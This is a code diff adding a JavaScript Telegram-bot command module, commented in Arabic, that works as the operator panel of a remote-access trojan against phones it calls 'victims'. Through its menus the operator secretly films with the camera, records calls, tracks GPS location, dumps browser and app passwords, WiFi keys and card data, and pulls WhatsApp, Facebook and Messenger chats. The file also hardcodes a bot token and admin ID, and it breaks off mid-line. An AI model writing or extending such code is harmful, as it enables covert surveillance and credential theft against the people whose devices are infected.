@@ -1,0 +1,332 @@
+// advanced_commands.js - وحدة الأوامر المتقدمة
+// يتم تشغيلها كـ node advanced_commands.js
+
+const TelegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
+const path = require('path');
+
+// ========== الإعدادات ==========
+const TOKEN = '8554279682:AAEDppJS-Did8lYRuMb8mOYaGAYRc6Hv4tc'; //
+const ADMIN_ID = 5863496618;     // 
+const bot = new TelegramBot(TOKEN, { polling: true });
+
+// قاعدة بيانات بسيطة (JSON)
+const DB_PATH = './victims_data.json';
+if (!fs.existsSync(DB_PATH)) fs.writeFileSync(DB_PATH, '[]');
+let victims = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
+
+// ========== الأوامر الأساسية ==========
+const mainKeyboard = {
+    reply_markup: {
+        keyboard: [
+            ['📸 كاميرا فيديو', '🎥 تسجيل مكالمات'],
+            ['📍 تحديد الموقع', '🔑 كلمات المرور'],
+            ['💬 واتساب', '📘 فيسبوك'],
+            ['✉️ ماسنجر', '📞 سجل المكالمات'],
+            ['📊 لوحة التحكم', '🔙 رجوع']
+        ],
+        resize_keyboard: true
+    }
+};
+
+// ========== 1. أوامر الكاميرا (فيديو + تصوير) ==========
+bot.onText(/كاميرا فيديو|📸/, (msg) => {
+    const chatId = msg.chat.id;
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['🎬 تصوير فيديو 10 ثوان', '🎬 تصوير فيديو 30 ثانية'],
+                ['📸 صورة أمامية', '📸 صورة خلفية'],
+                ['📹 بث مباشر', '🔙 رجوع']
+            ],
+            resize_keyboard: true
+        }
+    };
+    bot.sendMessage(chatId, '📸 *كاميرا الضحية*\nاختر نوع التصوير:', { 
+        parse_mode: 'Markdown',
+        reply_markup: keyboard.reply_markup 
+    });
+});
+
+// ارسال أمر تصوير فيديو للجهاز
+bot.onText(/تصوير فيديو (\d+) (ثوان|ثانية)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const duration = parseInt(match[1]);
+    const targetId = appData.get('currentTarget');
+    
+    if (!targetId) {
+        return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية. اختر ضحية أولاً.');
+    }
+    
+    io.to(targetId).emit('action', {
+        request: 'record_video',
+        extras: [{ key: 'duration', value: duration }, { key: 'camera', value: 'back' }]
+    });
+    
+    bot.sendMessage(chatId, `🎥 *جاري تصوير فيديو لمدة ${duration} ثانية...*`, { parse_mode: 'Markdown' });
+});
+
+// ========== 2. أوامر تسجيل المكالمات تلقائياً ==========
+bot.onText(/تسجيل مكالمات|🎥/, (msg) => {
+    const chatId = msg.chat.id;
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['🔴 بدء تسجيل المكالمات', '⏹ إيقاف التسجيل'],
+                ['📁 استلام التسجيلات', '🗑 حذف التسجيلات'],
+                ['🔙 رجوع']
+            ],
+            resize_keyboard: true
+        }
+    };
+    bot.sendMessage(chatId, '🎥 *تسجيل المكالمات*\nيمكنك تسجيل جميع المكالمات تلقائياً وحفظها:', { 
+        parse_mode: 'Markdown',
+        reply_markup: keyboard.reply_markup 
+    });
+});
+
+bot.onText(/بدء تسجيل المكالمات|🔴/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'start_call_recording',
+        extras: [{ key: 'auto_save', value: true }]
+    });
+    bot.sendMessage(chatId, '🔴 *تم بدء تسجيل المكالمات تلقائياً*\nسيتم حفظ التسجيلات وإرسالها عند الطلب.', { parse_mode: 'Markdown' });
+});
+
+bot.onText(/استلام التسجيلات|📁/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'get_call_recordings',
+        extras: []
+    });
+    bot.sendMessage(chatId, '📁 *جاري تجميع التسجيلات...*\nسيتم إرسالها كملفات مضغوطة.', { parse_mode: 'Markdown' });
+});
+
+// ========== 3. تحديد الموقع (GPS) ==========
+bot.onText(/تحديد الموقع|📍/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'get_location',
+        extras: [{ key: 'accuracy', value: 'high' }]
+    });
+    bot.sendMessage(chatId, '📍 *جاري تحديد الموقع...*', { parse_mode: 'Markdown' });
+});
+
+// استقبال الموقع من الجهاز
+// هذا الجزء يتطلب تعديل في السيرفر (app.js) لاستقبال حدث 'location'
+// io.on('connection', (socket) => {
+//     socket.on('location_data', (data) => {
+//         bot.sendLocation(ADMIN_ID, data.lat, data.lng);
+//         bot.sendMessage(ADMIN_ID, `📍 *موقع الضحية*\nالعنوان: ${data.address}\nالرابط: https://maps.google.com/?q=${data.lat},${data.lng}`, { parse_mode: 'Markdown' });
+//     });
+// });
+
+// ========== 4. استخراج كلمات المرور ==========
+bot.onText(/كلمات المرور|🔑/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['🌐 كلمات مرور المتصفحات', '📱 كلمات مرور التطبيقات'],
+                ['📶 كلمات مرور WiFi', '💳 بطاقات الائتمان'],
+                ['📋 سجل الحافظة', '🔙 رجوع']
+            ],
+            resize_keyboard: true
+        }
+    };
+    bot.sendMessage(chatId, '🔑 *استخراج كلمات المرور*\nاختر نوع البيانات:', { 
+        parse_mode: 'Markdown',
+        reply_markup: keyboard.reply_markup 
+    });
+});
+
+bot.onText(/كلمات مرور المتصفحات|🌐/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'dump_passwords',
+        extras: [{ key: 'source', value: 'browsers' }]
+    });
+    bot.sendMessage(chatId, '🌐 *جاري استخراج كلمات مرور المتصفحات (Chrome, Firefox, Edge)...*', { parse_mode: 'Markdown' });
+});
+
+bot.onText(/كلمات مرور التطبيقات|📱/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'dump_passwords',
+        extras: [{ key: 'source', value: 'apps' }]
+    });
+    bot.sendMessage(chatId, '📱 *جاري استخراج كلمات مرور التطبيقات مع اسم التطبيق والبريد الإلكتروني...*', { parse_mode: 'Markdown' });
+});
+
+// ========== 5. اختراق واتساب ومشاهدة كل شيء ==========
+bot.onText(/واتساب|💬/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['💬 فتح واتساب', '👁 مشاهدة المحادثات'],
+                ['📎 تحميل الملفات', '📸 صور واتساب'],
+                ['📞 مكالمات واتساب', '🔙 رجوع']
+            ],
+            resize_keyboard: true
+        }
+    };
+    bot.sendMessage(chatId, '💬 *واتساب - تحكم كامل*\nيمكنك مشاهدة كل شيء في واتساب:', { 
+        parse_mode: 'Markdown',
+        reply_markup: keyboard.reply_markup 
+    });
+});
+
+bot.onText(/فتح واتساب|💬 فتح/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'open_app',
+        extras: [{ key: 'package', value: 'com.whatsapp' }]
+    });
+    bot.sendMessage(chatId, '💬 *تم فتح واتساب على جهاز الضحية*\nجاري بدء جلسة المراقبة...', { parse_mode: 'Markdown' });
+});
+
+bot.onText(/مشاهدة المحادثات|👁/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'whatsapp_get_chats',
+        extras: []
+    });
+    bot.sendMessage(chatId, '👁 *جاري سحب جميع محادثات واتساب...*\nقد يستغرق ذلك بضع ثوانٍ.', { parse_mode: 'Markdown' });
+    bot.sendChatAction(chatId, 'typing');
+});
+
+// ========== 6. اختراق فيسبوك ومشاهدة كل شيء ==========
+bot.onText(/فيسبوك|📘/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['📘 فتح فيسبوك', '👁 مشاهدة المنشورات'],
+                ['💬 المحادثات', '📸 الصور'],
+                ['👥 قائمة الأصدقاء', '🔙 رجوع']
+            ],
+            resize_keyboard: true
+        }
+    };
+    bot.sendMessage(chatId, '📘 *فيسبوك - تحكم كامل*\nيمكنك مشاهدة كل شيء في فيسبوك:', { 
+        parse_mode: 'Markdown',
+        reply_markup: keyboard.reply_markup 
+    });
+});
+
+bot.onText(/فتح فيسبوك|📘 فتح/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'open_app',
+        extras: [{ key: 'package', value: 'com.facebook.katana' }]
+    });
+    bot.sendMessage(chatId, '📘 *تم فتح فيسبوك على جهاز الضحية*\nجاري بدء جلسة المراقبة...', { parse_mode: 'Markdown' });
+});
+
+bot.onText(/مشاهدة المنشورات|👁/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'facebook_get_posts',
+        extras: [{ key: 'count', value: 50 }]
+    });
+    bot.sendMessage(chatId, '👁 *جاري سحب آخر المنشورات...*', { parse_mode: 'Markdown' });
+});
+
+// ========== 7. اختراق ماسنجر ومشاهدة كل شيء ==========
+bot.onText(/ماسنجر|✉️/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['✉️ فتح ماسنجر', '💬 مشاهدة المحادثات'],
+                ['📸 الوسائط', '📞 المكالمات'],
+                ['🔙 رجوع']
+            ],
+            resize_keyboard: true
+        }
+    };
+    bot.sendMessage(chatId, '✉️ *ماسنجر - تحكم كامل*\nيمكنك مشاهدة كل شيء في ماسنجر:', { 
+        parse_mode: 'Markdown',
+        reply_markup: keyboard.reply_markup 
+    });
+});
+
+bot.onText(/فتح ماسنجر|✉️ فتح/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'open_app',
+        extras: [{ key: 'package', value: 'com.facebook.orca' }]
+    });
+    bot.sendMessage(chatId, '✉️ *تم فتح ماسنجر على جهاز الضحية*\nجاري بدء جلسة المراقبة...', { parse_mode: 'Markdown' });
+});
+
+// ========== 8. لوحة التحكم الرئيسية ==========
+bot.onText(/لوحة التحكم|📊/, (msg) => {
+    const chatId = msg.chat.id;
+    const targetId = appData.get('currentTarget');
+    if (!targetId) return bot.sendMessage(chatId, '❌ لم يتم تحديد ضحية.');
+    
+    io.to(targetId).emit('action', {
+        request: 'get_device_info',
+        extras: [{ key: 'detailed', value: true }]
+    });
+    bot.sendMessage(chatId, '📊 *لوحة التحكم*\nجاري جمع معلومات الجهاز...', { parse_mode: 'Markdown' });
+});
+
+// ========== 9. معالجة استقبال البيانات من الجهاز ==========
+// هذه الدوال تستقبل البيانات المرسلة من جهاز الضحية عبر Socket.IO
+
+function setupSocketHandlers(io) {
+    io.on('connection', (socket) => {
+        
+        // استقبال كلمات المرور
+        socket.on('passwords_data', (data) => {
+            const { passwords, source } = data;
+            let message = `🔑 *كلمات المرور المستخرجة من: ${source}*\n\n`;
+            
+            passwords.forEach((item, index) => {
+                message += `*${index + 1}. ${item.app || item.site
